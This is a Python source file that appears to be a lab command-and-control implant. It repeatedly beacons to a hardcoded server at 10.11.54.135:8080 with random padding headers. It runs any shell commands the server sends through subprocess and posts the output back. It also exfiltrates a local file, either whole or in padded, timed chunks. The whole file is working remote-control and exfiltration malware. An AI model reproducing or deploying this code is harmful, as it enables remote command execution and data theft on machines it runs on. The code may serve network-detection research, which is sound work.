import math, random, string
from time import sleep
import random
import requests
import time, json, yaml, os
import subprocess as sp
#import netifaces as ni

ip ="10.11.54.135"

beacon_url = "http://"+ip+":8080/beacon"
reply_command_url= "http://"+str(ip)+":8080/reply_command"
send_file_url = "http://"+str(ip)+":8080/send_file"
send_file_by_post_url = "http://"+str(ip)+":8080/send_file_by_post"
file_path = "./file.pdf"
while True:
    # Send GET request for beaconing
    result= ""
    pad = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(50,100)))
    headers = {
         "X-pad": pad
         }
    response = requests.get(beacon_url, headers =headers )
    print(response.text)
    if response.text != '{"commands":[]}\n': # if there is not command in list do not post anything
        if ('send_by_post' in response.text):
            files = {'exfil_file': open(file_path,'rb')}
            headers = {
                "File-Name": os.path.basename(file_path)
            }

            response = requests.post(send_file_by_post_url, files = files, headers=headers)
            print(response.text)
        elif  not ('download' in response.text):
            cmd_list=yaml.safe_load(response.text)
            for cmd in cmd_list["commands"]:
                result=  result + sp.getoutput(cmd)
                print(result)
                time.sleep(2)

            headers = {"Content-Type": "text/plain"}
            response = requests.post(reply_command_url, data=result.encode("utf-8"), headers=headers)
            print(response.text)
            """ 
            if we wanna same str format of executed command in the server we should 
            use header + encoding otherwise receiver gets the string in one line 
            """
        elif ('download' in response.text):
            chunk_size = 50236 # Chunk size in bytes, it sends 5mb pdf file in 100 requests
            total_size = os.path.getsize(file_path)
            total_chunk = math.ceil(total_size / chunk_size)
            chunk_number= 0
            iat = 0.01
            with open(file_path, 'rb') as file:
                for chunk_number in range(total_chunk):
                    chunk = file.read(chunk_size)
                    pad = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(4,50)))
                    headers={
                        "X-Chunk-Number": str(chunk_number), # recommendation of using the "X-" prefix for non-standard headers
                        "X-Total-Chunks": str(total_chunk),
                        "X-File-Name": os.path.basename(file_path),
			 "X-pad":pad}

                    #print(chunk_number, total_chunk)
                    response = requests.post(send_file_url, data=chunk, headers=headers)
                    print(response.text)
                    sleep(iat)
            file.close()


    time.sleep(random.randint(5,10))  # Wait for 10 seconds before next beacon
